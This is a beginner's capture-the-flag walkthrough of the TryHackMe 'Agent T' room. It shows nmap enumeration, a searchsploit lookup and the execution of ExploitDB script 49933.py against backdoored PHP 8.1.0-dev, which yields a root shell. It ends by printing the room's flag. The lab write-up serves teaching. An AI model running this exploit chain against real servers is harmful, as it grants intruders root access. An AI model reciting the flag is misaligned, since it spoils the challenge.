# Agent T

This is my first ever walkthrough! Hello and welcome to TryWalkMe, walkthroughs which help you develop further skills and help you in the long run! Today, we are looking at Agent T which can be found in this room: https://tryhackme.com/room/agentt. This room is very simple since there's only one port and one crucial exploit.

You need searchsploit installed to keep going. It's a very nifty tool and you can install it in Kali Linux and ParrotOS!

## Task 1

### Find the flag

Going to the site reveals a basic admin dashboard with no use. However, we must always perform enumeration before exploitation. We will run a detailed *nmap* scan.

```
┌─[sandstoop@parrot]─[~]
└──╼ $sudo nmap -sV -O -sC 10.10.204.92
[sudo] password for sandstoop: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-20 22:33 CEST
Nmap scan report for 10.10.204.92
Host is up (0.059s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=8/20%OT=80%CT=1%CU=36794%PV=Y%DS=2%DC=I%G=Y%TM=68A6
OS:3145%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(S
OS:P=108%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=108%GCD=2%ISR=10D%TI=Z%CI
OS:=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST
OS:11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=
OS:FE88%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=3F%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.31 seconds
```

There's only one port which means we need to focus on that. Now, **PHP cli server 5.5** is the same as **HTTPServer** in Python, it's a web server. Now, we need to search up what we found on Nmap. Good resources to find them are ExploitDB and GitHub. However, we will use a nifty little tool named *searchsploit* known as a local wrapper for ExploitDB which makes searching in the terminal.

```
┌─[sandstoop@parrot]─[~]
└──╼ $searchsploit PHP cli server --> No results, we can move on to the version of the PHP programming language, this is the web server! Nothing relates to our usecase.
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
ActiveWeb Contentserver CMS 5.6.2929 - Client | php/webapps/30299.txt
inClick Cloud Server 5.0 - SQL Injection      | php/webapps/42663.txt
Sad Raven's Click Counter 1.0 - 'passwd.dat'  | php/webapps/7844.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
┌─[sandstoop@parrot]─[~]
└──╼ $searchsploit PHP 8.1.0-dev
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Exe | php/webapps/49933.py <-- All other results were redacted for clarity
---------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Feel free to do some sifting through all of this! It's good practice to search up the entire Nmap service version. We shouldn't just be searching up the *PHP version* in this case, we should also search up the *PHP cli server* exploits to ensure nothing goes missing and we do this room! Assuming you have searchsploit and the ExploitDB database, we will find the exploit script in that database. These are the steps to find the exploit script:

```
┌─[sandstoop@parrot]─[~]
└──╼ $cd /usr/share/exploitdb/exploits -> The ExploitDB database
┌─[sandstoop@parrot]─[/usr/share/exploitdb/exploits]
└──╼ $cd php --> Goes to the PHP exploits (php/webapps/49933.py) 
┌─[sandstoop@parrot]─[/usr/share/exploitdb/exploits/php]
└──╼ $cd webapps --> Goes to the webapp exploits (webapps/49933.py)
┌─[sandstoop@parrot]─[/usr/share/exploitdb/exploits/php/webapps]
└──╼ $python3 49933.py --> Executes the script
Enter the full host url:
http://10.10.204.92         

Interactive shell is opened on http://10.10.204.92 
Can't acces tty; job crontol turned off.
$ 

```

We finally got access to a shell. We need to check if this exploit gives you root automatically or boots you to a non-privileged user.

```
$ whoami
root
```

Now, we will search for the flag and find it. This can be done with a simple *find* command.

```
$ find / -name "flag.txt" 2>/dev/null --> Finds flag.txt starting from root, discards stderr to /dev/null
/flag.txt -> Bonus

$ cd / --> Changes directory to /

$ ls --> Wait... this does not register as a change. This can be blamed to the usage of a tty (/bin/sh)
404.html
blank.html
css
gulpfile.js
img
index.php
js
package-lock.json
package.json
scss
vendor

$ cat /flag.txt --> Uses cat (concatenate) to print the flag
flag{hopefully_it_was_fun}
```

This challenge was very easy, only using one port (80 TCP HTTP) while having a root access backdoored version that we quickly found and exploited! Apart from having no other ports, the need of privilege escalation was depleted and searching up the PHP version gave us a working exploit!
